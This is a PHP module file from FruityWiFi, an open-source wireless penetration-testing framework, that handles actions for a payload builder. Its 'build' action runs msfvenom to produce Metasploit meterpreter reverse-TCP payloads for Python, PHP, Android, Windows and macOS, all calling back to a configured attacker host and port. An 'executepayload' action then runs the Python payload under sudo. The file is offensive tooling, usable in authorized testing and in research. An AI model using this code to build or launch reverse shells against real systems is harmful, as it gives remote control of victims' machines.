<? 
/*
    Copyright (C) 2013-2020 xtr4nge [_AT_] gmail.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
?>
<?
include "../../../login_check.php";
include "../../../config/config.php";
include "../_info_.php";
include "../../../functions.php";

// Checking POST & GET variables...
if ($regex == 1) {
    regex_standard($_GET["service"], "../msg.php", $regex_extra);
    regex_standard($_POST["action"], "../msg.php", $regex_extra);
    regex_standard($_GET["page"], "../msg.php", $regex_extra);
    regex_standard($_POST["payloadtype"], "../msg.php", $regex_extra);
    regex_standard($io_action, "../msg.php", $regex_extra);
}

$service = $_GET['service'];
$action = $_POST['action'];
$page = $_GET['page'];
$payloadtype = $_POST['payloadtype'];

if($service != "") {
    
    if ($action == "start") {
       	
    } else if($action == "stop") {
       
    }

}

if ($action == "deletepayload") {
	if (file_exists($payloc)){
		$exec = "rm -r $payloc";
		exec_fruitywifi($exec);
	}
}

if ($action == "build") {
	if ($payloadtype != "" ){
		
		//DELETE EXISTING PAY
		if (file_exists($payloc)){
		$exec = "rm -r $payloc";
		exec_fruitywifi($exec);
		}
     
                // COPY LOG
        	if ( 0 < filesize( $mod_logs ) ) {
            	$exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
            	exec_fruitywifi($exec);
            
            	$exec = "$bin_echo '' > $mod_logs";
            	exec_fruitywifi($exec);
        	}

		//PAYLOAD PYTHON
 		if ($payloadtype == "python"){
		$payname = "payload.py";
		$type = "python";
		$work = "true";

		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "screen -d -m msfvenom -p python/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -f raw -o $mod_path/includes/builds/$payname &>> $mod_logs";
		exec_fruitywifi($exec);
		}  

		//PAYLOAD PHP
 		if ($payloadtype == "php"){
		$payname = "payload.php";
		$type = "php";
		$work = "false";

		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);


		$exec = "screen -d -m msfvenom -p  php/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -f raw -o $mod_path/includes/builds/$payname &>> $mod_logs";
		exec_fruitywifi($exec);
		}  

		//PAYLOAD APP
 		if ($payloadtype == "app"){
		$payname = "payload.apk";
		$type = "apk";
		$work = "false";

		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);


		$exec = "screen -d -m msfvenom -p android/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -o $mod_path/includes/builds/$payname &>> $mod_logs";
		exec_fruitywifi($exec);
		}  

		//PAYLOAD EXE
 		if ($payloadtype == "exe"){
		$payname = "payload.exe";
		$type = "exe";
		$work = "false";

		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);


		$exec = "screen -d -m msfvenom -p windows/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port -f exe -o $mod_path/includes/builds/$payname &>> $mod_logs";
		exec_fruitywifi($exec);
		}  

		//PAYLOAD OSX
 		if ($payloadtype == "osx"){
		$payname = "payload.bin";
		$type = "bin";
		$work = "false";

		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);

		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
		exec_fruitywifi($exec);


		$exec = "screen -d -m msfvenom -p osx/x64/meterpreter_reverse_tcp lhost=$meterpreter_host lport=$meterpreter_port -f macho -o $mod_path/includes/builds/$payname &>> $mod_logs";
		exec_fruitywifi($exec);
		}  




	}
}

if ($action == "executepayload"){
	if ($paycomp == "true"){
	//Python PAYLOAD
	  if ($paytype == "python"){
		$exec = "cp $payloc $mod_path/includes/$payfile";
		exec_fruitywifi($exec);

		$exec = "$bin_sudo screen -d -m python $payfile";
		exec_fruitywifi($exec);

	  }
	
     }  
} 

if ($action == "stoppayload"){
     	$exec = "ps aux|grep -iEe 'payload' | grep -v grep | awk '{print $2}'";
		exec($exec,$output);	
		$exec = "kill " . $output[0];
		exec_fruitywifi($exec);

	if (file_exists($payfile)){
	  	$exec = "rm -r $payfile";
		exec_fruitywifi($exec);
	}
} 






if ($page == "status") {
    header('Location: ../../../action.php');
} else {
    header('Location: ../../action.php?page='.$mod_name);
}

?>
